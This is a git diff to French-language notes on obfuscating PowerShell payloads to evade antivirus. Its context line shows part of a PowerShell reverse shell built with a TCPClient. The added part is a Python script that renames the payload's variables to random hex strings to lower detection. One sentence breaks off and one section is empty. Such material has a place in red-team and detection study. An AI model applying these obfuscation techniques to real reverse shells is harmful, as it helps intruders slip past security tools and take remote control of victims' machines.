@@ -68,3 +68,64 @@ $ffffffffffffffffffffffffffffffff = New-Object System.Net.Sockets.TCPClient('127
 
 Cela donnera une entropie bien inférieur à celle précédente et a probablement de meilleur chance face au Antivirus.
 
+
+## __Scripts__
+
+### Calculate_entropy
+
+
+### Edit_variables_names
+
+Il faut faire attention car ce script 
+
+```python
+#!/bin/python3
+#
+# This script is an example. It is not perfect and you should use it with caution.
+# Source: https://github.com/t3l3machus/PowerShell-Obfuscation-Bible
+# Usage: python3 randomize-variables.py <path/to/powershell/script>
+
+import re
+from sys import argv
+from uuid import uuid4
+
+def get_file_content(path):
+	f = open(path, 'r')
+	content = f.read()
+	f.close()
+	return content
+	
+
+def main():
+
+	payload = get_file_content(argv[1])
+	used_var_names = []
+
+	# Identify variables definitions in script
+	variable_definitions = re.findall('\$[a-zA-Z0-9_]*[\ ]{0,}=', payload)
+	variable_definitions.sort(key=len)
+	variable_definitions.reverse()
+
+	# Replace variable names
+	for var in variable_definitions:
+		
+		var = var.strip("\n \r\t=")
+
+		while True:
+			
+			new_var_name = uuid4().hex
+			
+			if (new_var_name in used_var_names) or (re.search(new_var_name, payload)):
+				continue
+				
+			else:
+				used_var_names.append(new_var_name)
+				break	
+						
+		payload = payload.replace(var, f'${new_var_name}')
+	
+	print(payload + '\n')
+
+	
+main()
+```
